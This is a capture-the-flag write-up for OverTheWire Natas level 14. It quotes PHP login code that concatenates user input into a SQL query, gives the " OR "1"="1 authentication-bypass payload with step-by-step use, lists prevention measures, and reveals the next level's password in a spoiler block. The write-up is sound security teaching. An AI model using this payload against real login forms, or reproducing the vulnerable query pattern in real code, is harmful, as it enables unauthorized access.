# Natas Level 14 → 15

## Objective

Retrieve the password for the next level by exploiting a SQL Injection vulnerability in the login form.

---

## Enumeration

- Reviewed the webpage source code.
- Identified that user input is directly concatenated into an SQL query.
- Observed that neither the username nor password is sanitized.
- Determined that the application is vulnerable to SQL Injection.

---

## Source Code Analysis

The application connects to the MySQL database:

```php
$link = mysqli_connect('localhost', 'natas14', '<censored>');
mysqli_select_db($link, 'natas14');
```

The login query is constructed as:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

The query is executed using:

```php
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored>";
}
else {
    echo "Access denied!";
}
```

---

## Observation

The application directly inserts user input into the SQL statement.

No input validation, escaping, or prepared statements are used.

An attacker can therefore inject arbitrary SQL into either the username or password fields.

---

## Vulnerability

### SQL Injection (Authentication Bypass)

The original query is:

```sql
SELECT *
FROM users
WHERE username="<username>"
AND password="<password>"
```

Since user input is concatenated directly into the query, an attacker can modify the SQL logic.

By injecting an expression that always evaluates to **TRUE**, the authentication check can be bypassed.

---

# Request Analysis

## Original Input

Username

```text
admin
```

Password

```text
password
```

Resulting SQL query:

```sql
SELECT *
FROM users
WHERE username="admin"
AND password="password"
```

If the credentials are incorrect:

```text
Access denied!
```

---

## Injected Payload

Username

```text
" OR "1"="1
```

Password

```text
" OR "1"="1
```

The resulting SQL query becomes:

```sql
SELECT *
FROM users
WHERE username=""
OR "1"="1"
AND password=""
OR "1"="1"
```

Since:

```sql
"1"="1"
```

always evaluates to **TRUE**, the WHERE clause matches at least one record.

The application therefore treats the login as successful.

---

## Exploitation

### Step 1 - Open the Login Page

The application presents two input fields:

```text
Username
Password
```

---

### Step 2 - Enter the SQL Injection Payload

Username:

```text
" OR "1"="1
```

Password:

```text
" OR "1"="1
```

---

### Step 3 - Submit the Form

The application constructs the SQL query using the supplied input.

Instead of validating credentials, the injected condition causes the query to return existing rows.

---

### Step 4 - Authentication Bypass

The database returns one or more matching records.

The application executes:

```php
if(mysqli_num_rows(...) > 0)
```

which evaluates to:

```text
TRUE
```

---

### Step 5 - Retrieve the Password

The application displays:

```text
Successful login!
The password for natas15 is:
```

revealing the credentials for the next level.

---

## Attack Flow

```
Open Login Page
        │
        ▼
Identify SQL Query
        │
        ▼
Inject SQL Payload
        │
        ▼
Modify WHERE Clause
        │
        ▼
Condition Always TRUE
        │
        ▼
Database Returns Rows
        │
        ▼
Authentication Bypassed
        │
        ▼
Reveal Password
```

---

## Result

The login was successfully bypassed without knowing a valid username or password.

By exploiting SQL Injection, the application authenticated the attacker and revealed the password for **Natas Level 15**.

---

## Prevention

- Use prepared statements (parameterized queries).
- Never concatenate user input into SQL queries.
- Validate and sanitize all user input.
- Escape special characters when interacting with databases.
- Implement least-privilege database accounts.
- Return generic authentication errors to avoid leaking information.

---

## Key Takeaways

- SQL Injection occurs when user input is directly concatenated into SQL queries.
- Authentication mechanisms should never rely on dynamically built SQL strings.
- Prepared statements completely prevent this class of vulnerability.
- Even a simple login form can lead to full authentication bypass if input is not handled securely.
- SQL Injection remains one of the most critical web application vulnerabilities.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas15
Password : GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```

</details>